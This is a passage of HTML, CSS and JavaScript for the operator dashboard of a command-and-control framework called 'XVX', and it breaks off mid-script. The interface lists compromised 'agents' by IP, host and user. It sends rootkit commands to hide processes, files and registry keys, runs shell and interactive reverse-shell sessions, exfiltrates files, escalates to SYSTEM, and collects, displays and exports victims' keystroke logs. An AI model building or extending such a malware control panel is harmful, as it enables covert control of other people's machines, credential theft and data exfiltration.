            from { opacity: 0; transform: translateY(-30px) scale(0.95); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        
        .shell-header {
            padding: 16px 24px;
            background: linear-gradient(135deg, rgba(0,217,255,0.1) 0%, rgba(0,217,255,0.05) 100%);
            border-bottom: 1px solid var(--accent);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .shell-info {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        
        .shell-agent-id {
            color: var(--accent);
            font-size: 0.85em;
            font-weight: 700;
            letter-spacing: 0.5px;
        }
        
        .shell-agent-details {
            font-size: 0.7em;
            color: var(--text-muted);
            letter-spacing: 0.3px;
        }
        
        .shell-close {
            background: transparent;
            border: 1px solid var(--danger);
            color: var(--danger);
            padding: 6px 16px;
            cursor: pointer;
            font-size: 0.75em;
            border-radius: 6px;
            font-weight: 600;
            letter-spacing: 1px;
            transition: all 0.2s ease;
        }
        
        .shell-close:hover {
            background: var(--danger);
            color: var(--bg-dark);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px var(--danger-glow);
        }
        
        .shell-output {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            font-size: 0.8em;
            background: #000000;
            line-height: 1.7;
        }
        
        .shell-line {
            margin-bottom: 12px;
        }
        
        .shell-prompt {
            color: var(--accent);
            font-weight: 700;
        }
        
        .shell-command {
            color: var(--text-primary);
            margin-left: 8px;
        }
        
        .shell-result {
            color: var(--text-secondary);
            white-space: pre-wrap;
            margin-left: 20px;
            border-left: 2px solid var(--accent);
            padding-left: 12px;
            margin-top: 6px;
            background: rgba(0,217,255,0.02);
            padding: 8px 12px;
            border-radius: 4px;
        }
        
        .shell-error {
            color: var(--danger);
            background: var(--danger-glow);
        }
        
        /* Responsive Design pour shells */
        @media (max-width: 1400px) {
            .shell-panel,
            .shell-system-panel {
                height: 400px;
            }
        }
        
        @media (max-width: 1024px) {
            .shell-panel,
            .shell-system-panel {
                height: 350px;
            }
            
            .sidebar {
                width: 200px;
            }
            
            .top-bar {
                padding: 16px 20px;
            }
            
            .command-panel {
                grid-template-columns: 1fr 1fr;
                grid-template-rows: auto auto;
            }
            
            .command-panel input {
                grid-column: 1 / -1;
            }
            
            .command-panel button {
                grid-column: 1 / -1;
            }
        }
        
        @media (max-width: 768px) {
            body {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
                height: auto;
                border-right: none;
                border-bottom: 1px solid var(--border);
            }
            
            .logo {
                padding: 16px 20px;
                flex-direction: row;
                align-items: center;
                gap: 12px;
            }
            
            .logo-text {
                font-size: 1.2em;
            }
            
            .logo-subtitle {
                font-size: 0.65em;
            }
            
            .nav-menu {
                padding: 0;
                display: flex;
                flex-direction: row;
                overflow-x: auto;
            }
            
            .nav-item {
                flex: 1;
                margin: 0;
                padding: 12px 16px;
                border-radius: 0;
                border-left: none;
                border-bottom: 3px solid transparent;
                justify-content: center;
            }
            
            .nav-item.active {
                border-left: none;
                border-bottom-color: var(--accent);
            }
            
            .nav-text {
                font-size: 0.75em;
            }
            
            .nav-badge {
                position: absolute;
                top: 8px;
                right: 8px;
                padding: 2px 6px;
                font-size: 0.65em;
            }
            
            .sidebar-footer {
                display: none;
            }
            
            .top-bar {
                padding: 12px 16px;
                flex-direction: column;
                gap: 12px;
                align-items: flex-start;
            }
            
            .view-title {
                font-size: 0.95em;
            }
            
            .stats-compact {
                width: 100%;
                justify-content: space-around;
            }
            
            .stat-compact {
                padding: 10px 16px;
            }
            
            .stat-compact-value {
                font-size: 1.4em;
            }
            
            .stat-compact-label {
                font-size: 0.6em;
            }
            
            .content-wrapper {
                padding: 16px;
            }
            
            .section {
                padding: 16px;
                margin-bottom: 16px;
            }
            
            .section-title {
                font-size: 0.8em;
            }
            
            .command-panel {
                grid-template-columns: 1fr;
                gap: 10px;
                padding: 12px;
            }
            
            .command-panel select,
            .command-panel input {
                padding: 12px;
                font-size: 0.8em;
                width: 100%;
            }
            
            .command-panel button {
                padding: 14px 16px;
                font-size: 0.75em;
                width: 100%;
                letter-spacing: 0.5px;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }
            
            table {
                font-size: 0.7em;
            }
            
            th, td {
                padding: 10px 8px;
                font-size: 0.75em;
            }
            
            .status-badge {
                padding: 3px 8px;
                font-size: 0.65em;
            }
            
            button, select, input {
                box-sizing: border-box;
            }
            
            .shell-panel,
            .shell-system-panel {
                height: 300px;
                margin-top: 16px;
            }
            
            .shell-header,
            .shell-system-header {
                padding: 12px 16px;
            }
            
            .shell-agent-id {
                font-size: 0.75em;
            }
            
            .shell-output {
                padding: 12px;
                font-size: 0.7em;
            }
            
            .shell-input-container {
                padding: 12px 16px;
                gap: 10px;
                flex-wrap: wrap;
            }
            
            .shell-input {
                flex: 1;
                min-width: 0;
                padding: 12px;
                font-size: 0.75em;
            }
            
            .shell-send {
                padding: 12px 20px;
                font-size: 0.75em;
                white-space: nowrap;
                min-width: 80px;
            }
            
            .shell-close {
                padding: 8px 14px;
                font-size: 0.7em;
            }
        }
        
        @media (max-width: 480px) {
            .logo-text {
                font-size: 1em;
                letter-spacing: 2px;
            }
            
            .logo-subtitle {
                font-size: 0.6em;
            }
            
            .nav-icon {
                font-size: 1em;
            }
            
            .nav-text {
                display: none;
            }
            
            .view-title::before {
                height: 20px;
            }
            
            .stats-compact {
                gap: 0;
            }
            
            .stat-compact {
                padding: 8px 12px;
            }
            
            .stat-compact-value {
                font-size: 1.2em;
            }
            
            .section {
                padding: 12px;
            }
            
            .command-panel select,
            .command-panel input {
                padding: 10px;
                font-size: 0.75em;
            }
            
            .command-panel button {
                padding: 12px 14px;
                font-size: 0.7em;
                letter-spacing: 0.3px;
            }
            
            table {
                display: block;
                overflow-x: auto;
                white-space: nowrap;
            }
            
            .shell-panel,
            .shell-system-panel {
                height: 250px;
            }
            
            .shell-input-container {
                padding: 10px 12px;
                gap: 8px;
            }
            
            .shell-input {
                padding: 10px;
                font-size: 0.7em;
            }
            
            .shell-send {
                padding: 10px 16px;
                font-size: 0.7em;
                min-width: 70px;
            }
        }
        
        .shell-input-container {
            padding: 16px 20px;
            background: var(--bg-card);
            border-top: 1px solid var(--border);
            display: flex;
            gap: 12px;
        }
        
        .shell-input {
            flex: 1;
            background: #000000;
            border: 1px solid var(--border);
            color: var(--text-primary);
            padding: 12px 16px;
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8em;
            transition: all 0.2s ease;
        }
        
        .shell-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px var(--accent-glow);
        }
        
        .shell-send {
            background: transparent;
            border: 1px solid var(--accent);
            color: var(--accent);
            padding: 12px 24px;
            font-weight: 700;
            letter-spacing: 1px;
            cursor: pointer;
            border-radius: 6px;
            transition: all 0.2s ease;
        }
        
        .shell-send:hover {
            background: var(--accent);
            color: var(--bg-dark);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px var(--accent-glow);
        }
        
        /* Sections */
        .section {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 20px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
        }
        
        .section-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--border);
        }
        
        .section-title {
            font-size: 0.9em;
            font-weight: 600;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 10px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }
        
        .section-title::before {
            content: '';
            width: 4px;
            height: 4px;
            background: var(--accent);
            box-shadow: 0 0 10px var(--accent);
        }
        
        /* Table */
        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
        }
        
        th {
            background: var(--bg-dark);
            color: var(--text-secondary);
            font-weight: 600;
            text-transform: uppercase;
            font-size: 0.7em;
            letter-spacing: 1.2px;
            padding: 14px 16px;
            text-align: left;
            border-bottom: 2px solid var(--border);
        }
        
        td {
            padding: 14px 16px;
            border-bottom: 1px solid var(--border);
            font-size: 0.8em;
            background: var(--bg-card);
        }
        
        tr {
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        tbody tr:hover {
            background: var(--bg-hover) !important;
            cursor: pointer;
            transform: scale(1.01);
            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
        }
        
        tbody tr:hover td {
            background: var(--bg-hover);
        }
        
        tbody tr {
            cursor: pointer;
        }
        
        /* Command Panel */
        .command-panel {
            display: grid;
            grid-template-columns: 1fr 1fr 2fr auto;
            gap: 12px;
            padding: 16px;
            background: var(--bg-dark);
            border: 1px solid var(--border);
            border-radius: 8px;
        }
        
        select, input, button {
            padding: 12px 16px;
            background: var(--bg-card);
            color: var(--text-primary);
            border: 1px solid var(--border);
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8em;
            transition: all 0.2s ease;
        }
        
        select:focus, input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px var(--accent-glow);
        }
        
        button {
            background: var(--bg-card);
            color: var(--accent);
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            cursor: pointer;
            border: 1px solid var(--accent);
        }
        
        button.privesc-active {
            background: var(--danger-glow);
            color: var(--danger);
            border: 2px solid var(--danger);
            box-shadow: 0 0 20px var(--danger-glow);
            animation: pulse-red 2s infinite;
        }
        
        @keyframes pulse-red {
            0%, 100% { box-shadow: 0 0 15px var(--danger-glow); }
            50% { box-shadow: 0 0 30px var(--danger-glow); }
        }
        
        button:hover {
            background: var(--accent);
            color: var(--bg-dark);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px var(--accent-glow);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        /* Status Badges */
        .status-badge {
            display: inline-block;
            padding: 5px 12px;
            font-size: 0.7em;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            border-radius: 4px;
            border: 1px solid;
        }
        
        .status-online {
            color: var(--success);
            background: var(--success-glow);
            border-color: var(--success);
        }
        
        .status-offline {
            color: var(--text-muted);
            background: rgba(95, 99, 104, 0.1);
            border-color: var(--text-muted);
        }
        
        /* Agent ID */
        .agent-id {
            color: var(--text-secondary);
            font-size: 0.8em;
            font-weight: 500;
        }
        
        .ip-address {
            color: var(--accent);
            font-size: 0.85em;
            font-weight: 600;
        }
        
        /* Output Box */
        .output-box {
            background: #000000;
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 12px;
            font-size: 0.75em;
            max-height: 100px;
            overflow-y: auto;
            color: var(--text-secondary);
            line-height: 1.6;
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: var(--bg-dark);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--accent);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: var(--success);
        }
        
        /* Loading animation */
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.6; transform: scale(0.98); }
        }
        
        .loading {
            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }
        
        /* Content wrapper scrollbar */
        .content-wrapper::-webkit-scrollbar {
            width: 12px;
        }
        
        .content-wrapper::-webkit-scrollbar-track {
            background: var(--bg-dark);
        }
        
        .content-wrapper::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 6px;
        }
        
        .content-wrapper::-webkit-scrollbar-thumb:hover {
            background: var(--accent);
        }
    </style>
    <script>
        // CRITICAL: Définir showView dans le HEAD pour qu'elle soit disponible AVANT les onclick inline
        function showView(viewName, sourceEvent) {
            // Hide all panels
            document.querySelectorAll('.view-panel').forEach(panel => {
                panel.classList.remove('active');
            });
            
            // Show selected panel
            const targetPanel = document.getElementById('view-' + viewName);
            if (targetPanel) {
                targetPanel.classList.add('active');
            } else {
                console.error('[JS] Panel not found: view-' + viewName);
                return;
            }
            
            // Update nav items
            document.querySelectorAll('.nav-item').forEach(item => {
                item.classList.remove('active');
            });
            
            // If called from nav click, update active nav item
            if (sourceEvent && sourceEvent.target) {
                const navItem = sourceEvent.target.closest('.nav-item');
                if (navItem) navItem.classList.add('active');
            } else {
                // Find and activate the corresponding nav item
                const navItems = document.querySelectorAll('.nav-item');
                navItems.forEach(item => {
                    if (item.onclick && item.onclick.toString().includes(viewName)) {
                        item.classList.add('active');
                    }
                });
            }
            
            // Update view title
            const titles = {
                'agents': 'AGENTS',
                'results': 'RESULTS',
                'keylogger': 'KEYLOGGER'
            };
            document.getElementById('view-title').textContent = titles[viewName] || 'AGENTS';
        }
    </script>
</head>
<body>
    <!-- Sidebar -->
    <div class="sidebar">
        <div class="logo">
            <div class="logo-text">XVX</div>
            <div class="logo-subtitle">C2 FRAMEWORK</div>
        </div>
        
        <nav class="nav-menu">
            <a href="#" class="nav-item active" onclick="showView('agents', event); return false;">
                <span class="nav-icon">▶</span>
                <span class="nav-text">Agents</span>
                <span class="nav-badge" id="badge-agents">0</span>
            </a>
            <a href="#" class="nav-item" onclick="showView('results', event); return false;">
                <span class="nav-icon">✓</span>
                <span class="nav-text">Results</span>
                <span class="nav-badge" id="badge-results">0</span>
            </a>
            <a href="#" class="nav-item" onclick="showView('keylogger', event); return false;">
                <span class="nav-icon">⌨</span>
                <span class="nav-text">Keylogger</span>
                <span class="nav-badge" id="badge-keylogger">0</span>
            </a>
        </nav>
        
        <div class="sidebar-footer">
            <div class="connection-status">
                <div class="status-dot"></div>
                <span>C2 ONLINE</span>
            </div>
            <div class="creator-credit">
                Created by <a href="https://github.com/28Zaaky" target="_blank">28Zaaky</a>
            </div>
        </div>
    </div>
    
    <!-- Main Content -->
    <div class="main-content">
        <div class="top-bar">
            <div class="view-title" id="view-title">AGENTS</div>
            <div class="stats-compact">
                <div class="stat-compact">
                    <div class="stat-compact-value" id="stat-agents">0</div>
                    <div class="stat-compact-label">Agents</div>
                </div>
                <div class="stat-compact">
                    <div class="stat-compact-value" id="stat-tasks">0</div>
                    <div class="stat-compact-label">Tasks</div>
                </div>
                <div class="stat-compact">
                    <div class="stat-compact-value" id="stat-results">0</div>
                    <div class="stat-compact-label">Results</div>
                </div>
            </div>
        </div>
        
        <div class="content-wrapper">
            <!-- View: Agents -->
            <div id="view-agents" class="view-panel active">
                <div class="section">
                    <div class="section-header">
                        <div class="section-title">Active Sessions</div>
                    </div>
                    <table id="agents-table">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>IP</th>
                                <th>Host</th>
                                <th>User</th>
                                <th>OS</th>
                                <th>Last Seen</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody></tbody>
                    </table>
                </div>
                
                <div class="section">
                    <div class="section-header">
                        <div class="section-title">Command Control</div>
                    </div>
                    <div class="command-panel">
                        <select id="agent-select">
                            <option value="">Select Target</option>
                        </select>
                        <select id="command-select">
                            <option value="">Select Module</option>
                            <optgroup label="Stealth Operations">
                                <option value="hide_process|">Hide Process</option>
                                <option value="hide_file|">Hide File/Folder</option>
                                <option value="hide_registry|">Hide Registry Key</option>
                                <option value="unhide_process|">Unhide Process</option>
                                <option value="unhide_file|">Unhide File</option>
                                <option value="unhide_registry|">Unhide Registry Key</option>
                                <option value="unhide_all">Unhide All</option>
                            </optgroup>
                            <optgroup label="Command Execution">
                                <option value="shell|">Execute Shell Command</option>
                                <option value="revshell_start">Start Interactive Shell</option>
                                <option value="revshell_stop">Stop Interactive Shell</option>
                                <option value="revshell_input|">Send Shell Input</option>
                                <option value="revshell_output">Get Shell Output</option>
                            </optgroup>
                            <optgroup label="File Operations">
                                <option value="exfil|">Exfiltrate File</option>
                            </optgroup>
                            <optgroup label="Privilege Escalation">
                                <option value="privesc">Escalate to SYSTEM</option>
                            </optgroup>
                            <optgroup label="Configuration">
                                <option value="sleep|">Change Beacon Interval (ms)</option>
                                <option value="die">Terminate Rootkit</option>
                            </optgroup>
                        </select>
                        <input type="text" id="command-arg" placeholder="arguments..." />
                        <button id="execute-btn" onclick="sendCommand()">EXECUTE</button>
                    </div>
                    
                    <!-- Interactive Shell USER -->
                    <div id="shell-panel" class="shell-panel">
                        <div class="shell-header">
                            <div class="shell-info">
                                <div class="shell-agent-id" id="shell-agent-id">No Agent Selected</div>
                                <div class="shell-agent-details" id="shell-agent-details"></div>
                            </div>
                            <button class="shell-close" onclick="closeShell()">CLOSE</button>
                        </div>
                        <div class="shell-output" id="shell-output">
                            <div class="shell-line">
                                <span style="color: var(--text-muted);">Welcome to XVX Interactive Shell</span>
                            </div>
                            <div class="shell-line">
                                <span style="color: var(--text-muted);">Click an agent to start session</span>
                            </div>
                        </div>
                        <div class="shell-input-container">
                            <input type="text" class="shell-input" id="shell-input" placeholder="Enter command..." onkeypress="handleShellEnter(event)" />
                            <button class="shell-send" onclick="sendShellCommand()">SEND</button>
                        </div>
                    </div>
                    
                    <!-- Interactive Shell SYSTEM -->
                    <div id="shell-system-panel" class="shell-system-panel">
                        <div class="shell-system-header">
                            <div class="shell-info">
                                <div class="shell-agent-id">
                                    <span class="shell-system-badge">ELEVATED</span>
                                </div>
                                <div class="shell-agent-details" id="shell-system-agent-details">Privilege Escalation Active</div>
                            </div>
                            <button class="shell-close" onclick="closeSystemShell()">CLOSE</button>
                        </div>
                        <div class="shell-output" id="shell-system-output">
                            <div class="shell-line">
                                <span style="color: ff0000;">[ SYSTEM SHELL ]</span>
                            </div>
                            <div class="shell-line">
                                <span style="color: var(--text-muted);">Waiting for privilege escalation...</span>
                            </div>
                        </div>
                        <div class="shell-input-container">
                            <input type="text" class="shell-input" id="shell-system-input" placeholder="Enter SYSTEM command..." onkeypress="handleSystemShellEnter(event)" />
                            <button class="shell-send" onclick="sendSystemShellCommand()">SEND</button>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- View: Results -->
            <div id="view-results" class="view-panel">
                <div class="section">
                    <div class="section-header">
                        <div class="section-title">Execution Results</div>
                    </div>
                    <table id="results-table">
                        <thead>
                            <tr>
                                <th>Timestamp</th>
                                <th>Agent</th>
                                <th>Command</th>
                                <th>Status</th>
                                <th>Output</th>
                            </tr>
                        </thead>
                        <tbody></tbody>
                    </table>
                </div>
            </div>
            
            <!-- View: Keylogger -->
            <div id="view-keylogger" class="view-panel">
                <div class="section">
                    <div class="section-header">
                        <div class="section-title">Keystroke Logs</div>
                        <div style="display: flex; gap: 10px; align-items: center;">
                            <select id="keylog-agent-filter" onchange="loadKeylogs()" style="padding: 8px; background: var(--bg-dark); color: var(--text); border: 1px solid var(--border); border-radius: 4px; font-family: 'JetBrains Mono', monospace;">
                                <option value="">All Agents</option>
                            </select>
                            <button onclick="exportKeylogs()" style="padding: 8px 16px; background: var(--accent); color: var(--bg); border: none; border-radius: 4px; cursor: pointer; font-weight: 600;">EXPORT</button>
                        </div>
                    </div>
                    <div id="keylog-container" style="max-height: 70vh; overflow-y: auto; background: var(--bg-dark); border-radius: 6px; padding: 20px;">
                        <!-- Keylogs will be inserted here -->
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        console.log('[JS] ========== XvX C2 DASHBOARD SCRIPT LOADED ==========');
        console.log('[JS] Initializing global variables...');
        
        // Capture toutes les erreurs JavaScript
        window.onerror = function(msg, url, lineNo, columnNo, error) {
            console.error('[JS GLOBAL ERROR]', msg, 'at', url, lineNo + ':' + columnNo);
            console.error('[JS GLOBAL ERROR] Stack:', error ? error.stack : 'N/A');
            return false;
        };
        
        window.addEventListener('unhandledrejection', function(event) {
            console.error('[JS PROMISE REJECTION]', event.reason);
        });
        
        let statsData = { agents: 0, tasks: 0, results: 0 };
        let currentShellAgent = null;
        let shellHistory = [];
        let shellHistoryIndex = -1;
        
        function updateStats() {
            try {
                const statAgents = document.getElementById('stat-agents');
                const statTasks = document.getElementById('stat-tasks');
                const statResults = document.getElementById('stat-results');
                const badgeAgents = document.getElementById('badge-agents');
                const badgeResults = document.getElementById('badge-results');
                
                if (statAgents) statAgents.textContent = statsData.agents;
                if (statTasks) statTasks.textContent = statsData.tasks;
                if (statResults) statResults.textContent = statsData.results;
                if (badgeAgents) badgeAgents.textContent = statsData.agents;
                if (badgeResults) badgeResults.textContent = statsData.results;
                
                console.log('[JS] Stats updated:', statsData);
            } catch (err) {
                console.error('[JS] updateStats() failed:', err);
            }
        }
        
        function loadAgents() {
            console.log('[JS] ===== loadAgents() START =====');
            console.log('[JS] Fetching /api/agents...');
            fetch('/api/agents')
                .then(r => {
                    console.log('[JS] /api/agents response status:', r.status);
                    console.log('[JS] Response headers:', r.headers);
                    return r.json();
                })
                .then(agents => {
                    console.log('[JS] ===== AGENTS RECEIVED =====');
                    console.log('[JS] Received agents count:', agents.length);
                    console.log('[JS] Full agents data:', JSON.stringify(agents, null, 2));
                    
                    const tbody = document.querySelector('#agents-table tbody');
                    const select = document.getElementById('agent-select');
                    
                    console.log('[JS] DOM elements found:');
                    console.log('[JS]   tbody:', tbody);
                    console.log('[JS]   select:', select);
                    
                    if (!tbody || !select) {
                        console.error('[JS] !!!!! CRITICAL ERROR !!!!!');
                        console.error('[JS] Missing DOM elements: tbody=' + tbody + ', select=' + select);
                        console.error('[JS] Available tables:', document.querySelectorAll('table'));
                        console.error('[JS] Available tbody:', document.querySelectorAll('tbody'));
                        return;
                    }
                    
                    console.log('[JS] Clearing tbody and select...');
                    tbody.innerHTML = '';
                    select.innerHTML = '<option value="">Select Target</option>';
                    
                    // Update keylog agent filter dropdown
                    const keylogFilter = document.getElementById('keylog-agent-filter');
                    if (keylogFilter) {
                        const currentFilter = keylogFilter.value;
                        keylogFilter.innerHTML = '<option value="">All Agents</option>';
                        agents.forEach(a => {
                            const opt = document.createElement('option');
                            opt.value = a.agent_id;
                            opt.textContent = a.hostname + ' (' + a.ip_address + ')';
                            if (a.agent_id === currentFilter) opt.selected = true;
                            keylogFilter.appendChild(opt);
                        });
                    }
                    
                    console.log('[JS] Starting to process agents...');
                    let onlineCount = 0;
                    agents.forEach((a, idx) => {
                        console.log('[JS] Agent ' + (idx + 1) + ':', a.hostname, a.agent_id);
                        const row = tbody.insertRow();
                        const now = new Date();
                        const lastSeen = new Date(a.last_seen);
                        const diffMinutes = (now - lastSeen) / 60000;
                        const isOnline = diffMinutes < 2.5;  // 2.5 minutes threshold for 60s beacon interval
                        if (isOnline) onlineCount++;
                        
                        const statusBadge = document.createElement('span');
                        statusBadge.className = isOnline ? 'status-badge status-online' : 'status-badge status-offline';
                        statusBadge.textContent = isOnline ? '[ONLINE]' : '[OFFLINE]';
                        const statusHTML = statusBadge.outerHTML;
                        
                        const time = lastSeen.toLocaleTimeString();
                        
                        const agentIdSpan = document.createElement('span');
                        agentIdSpan.className = 'agent-id';
                        agentIdSpan.textContent = a.agent_id.substring(0, 12);
                        
                        const ipSpan = document.createElement('span');
                        ipSpan.className = 'ip-address';
                        ipSpan.textContent = a.ip_address || 'N/A';
                        
                        // Create cells
                        const cell1 = row.insertCell();
                        cell1.innerHTML = agentIdSpan.outerHTML;
                        
                        const cell2 = row.insertCell();
                        cell2.innerHTML = ipSpan.outerHTML;
                        
                        const cell3 = row.insertCell();
                        cell3.textContent = a.hostname;
                        
                        const cell4 = row.insertCell();
                        cell4.textContent = a.username;
                        
                        const cell5 = row.insertCell();
                        cell5.textContent = a.os_version;
                        
                        const cell6 = row.insertCell();
                        cell6.textContent = time;
                        
                        const cell7 = row.insertCell();
                        cell7.innerHTML = statusHTML;
                        
                        row.onclick = () => openShell(a);
                        
                        const option = document.createElement('option');
                        option.value = a.agent_id;
                        option.textContent = a.hostname + ' [' + a.ip_address + ']';
                        select.appendChild(option);
                    });
                    
                    console.log('[JS] All agents processed successfully!');
                    console.log('[JS] tbody row count:', tbody.rows.length);
                    console.log('[JS] select option count:', select.options.length);
                    
                    statsData.agents = onlineCount;
                    updateStats();
                    console.log('[JS] ===== loadAgents() COMPLETE =====');
                    console.log('[JS] Online agents:', onlineCount);
                })
                .catch(err => {
                    console.error('[JS] !!!!! loadAgents() FAILED !!!!!');
                    console.error('[JS] Error:', err);
                    console.error('[JS] Stack:', err.stack);
                });
        }
        
        function loadResults() {
            console.log('[JS] loadResults() called');
            fetch('/api/results')
                .then(r => {
                    console.log('[JS] /api/results response status:', r.status);
                    return r.json();
                })
                .then(results => {
                    console.log('[JS] Received results:', results.length, results);
                    const tbody = document.querySelector('#results-table tbody');
                    if (!tbody) {
                        console.error('[JS] Missing tbody for results-table');
                        return;
                    }
                    
                    tbody.innerHTML = '';
                    
                    results.forEach(r => {
                        const row = tbody.insertRow();
                        const statusColor = r.status === 'OK' ? 'var(--accent-primary)' : 'var(--accent-danger)';
                        const time = new Date(r.received_at).toLocaleTimeString();
                        const output = r.output.length > 150 ? r.output.substring(0, 150) + '...' : r.output;
                        
                        // Cell 1: Time
                        const resCell1 = row.insertCell();
                        resCell1.textContent = time;
                        
                        // Cell 2: Agent ID
                        const resCell2 = row.insertCell();
                        const agentIdSpan = document.createElement('span');
                        agentIdSpan.className = 'agent-id';
                        agentIdSpan.textContent = r.agent_id.substring(0, 12) + '...';
                        resCell2.appendChild(agentIdSpan);
                        
                        // Cell 3: Command
                        const resCell3 = row.insertCell();
                        resCell3.textContent = r.command;
                        
                        // Cell 4: Status
                        const resCell4 = row.insertCell();
                        resCell4.style.color = statusColor;
                        resCell4.style.fontWeight = '700';
                        resCell4.textContent = r.status;
                        
                        // Cell 5: Output
                        const resCell5 = row.insertCell();
                        const outputDiv = document.createElement('div');
                        outputDiv.className = 'output-box';
                        outputDiv.textContent = output;
                        resCell5.appendChild(outputDiv);
                    });
                    
                    statsData.results = results.length;
                    statsData.tasks = results.length; // Approximation
                    updateStats();
                    console.log('[JS] loadResults() complete, results count:', results.length);
                })
                .catch(err => {
                    console.error('[JS] loadResults() failed:', err);
                });
        }
        
        function loadKeylogs() {
            console.log('[JS] loadKeylogs() called');
            const agentFilter = document.getElementById('keylog-agent-filter').value;
            const url = agentFilter ? '/api/keylogs?agent_id=' + agentFilter : '/api/keylogs';
            
            fetch(url)
                .then(r => r.json())
                .then(keylogs => {
                    console.log('[JS] Received keylogs:', keylogs.length);
                    const container = document.getElementById('keylog-container');
                    
                    if (keylogs.length === 0) {
                        container.innerHTML = '<div style="text-align: center; padding: 40px; color: var(--text-muted);">No keystroke logs yet</div>';
                        document.getElementById('badge-keylogger').textContent = '0';
                        return;
                    }
                    
                    container.innerHTML = '';
                    document.getElementById('badge-keylogger').textContent = keylogs.length;
                    
                    // Group keylogs by agent
                    const byAgent = {};
                    keylogs.forEach(k => {
                        if (!byAgent[k.agent_id]) {
                            byAgent[k.agent_id] = {
                                hostname: k.hostname,
                                ip: k.ip_address,
                                logs: []
                            };
                        }
                        byAgent[k.agent_id].logs.push(k);
                    });
                    
                    // Display each agent's keylogs
                    Object.keys(byAgent).forEach(agentId => {
                        const agentData = byAgent[agentId];
                        
                        // Agent header
                        const agentHeader = document.createElement('div');
                        agentHeader.style.cssText = 'background: var(--bg); padding: 15px; border-left: 4px solid var(--accent); margin-bottom: 15px; border-radius: 4px;';
                        
                        const agentTitle = document.createElement('div');
                        agentTitle.style.cssText = 'font-weight: 700; color: var(--accent); font-size: 14px; margin-bottom: 5px;';
                        agentTitle.textContent = agentData.hostname + ' (' + agentData.ip + ')';
                        
                        const agentSubtitle = document.createElement('div');
                        agentSubtitle.style.cssText = 'color: var(--text-muted); font-size: 12px;';
                        agentSubtitle.textContent = agentData.logs.length + ' keystroke sessions';
                        
                        agentHeader.appendChild(agentTitle);
                        agentHeader.appendChild(agentSubtitle);
                        container.appendChild(agentHeader);
                        
                        // Display each keylog session
                        agentData.logs.forEach(log => {
                            const logBox = document.createElement('div');
                            logBox.style.cssText = 'background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 20px; margin-bottom: 15px; border-radius: 12px; border: 1px solid rgba(0, 255, 136, 0.2); box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); font-family: "Segoe UI", monospace; transition: all 0.3s ease;';
                            logBox.onmouseenter = () => { logBox.style.borderColor = 'rgba(0, 255, 136, 0.6)'; logBox.style.boxShadow = '0 6px 20px rgba(0, 255, 136, 0.2)'; };
                            logBox.onmouseleave = () => { logBox.style.borderColor = 'rgba(0, 255, 136, 0.2)'; logBox.style.boxShadow = '0 4px 15px rgba(0, 0, 0, 0.3)'; };
                            
                            // Timestamp header
                            const timestamp = document.createElement('div');
                            timestamp.style.cssText = 'color: #00ff88; font-size: 11px; margin-bottom: 15px; padding-bottom: 8px; border-bottom: 1px solid rgba(0, 255, 136, 0.2); display: flex; align-items: center; gap: 8px; font-weight: 600;';
                            const date = new Date(log.received_at);
                            timestamp.innerHTML = '<span style="font-size: 14px;"></span> ' + date.toLocaleString('fr-FR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' });
                            logBox.appendChild(timestamp);
                            
                            // Parse and format output
                            const content = document.createElement('div');
                            content.style.cssText = 'color: var(--text); line-height: 1.8;';
                            
                            // Afficher CLEANED TEXT en premier (gros et visible)
                            if (log.cleaned_text && log.cleaned_text.trim()) {
                                const cleanedDiv = document.createElement('div');
                                cleanedDiv.style.cssText = 'background: linear-gradient(135deg, #0a3d0a 0%, #1a5c1a 100%); border: 2px solid #00ff88; border-radius: 10px; padding: 20px; margin-bottom: 15px; box-shadow: 0 0 20px rgba(0, 255, 136, 0.3), inset 0 0 40px rgba(0, 255, 136, 0.1); position: relative; overflow: hidden;';
                                
                                // Effet de brillance
                                const shine = document.createElement('div');
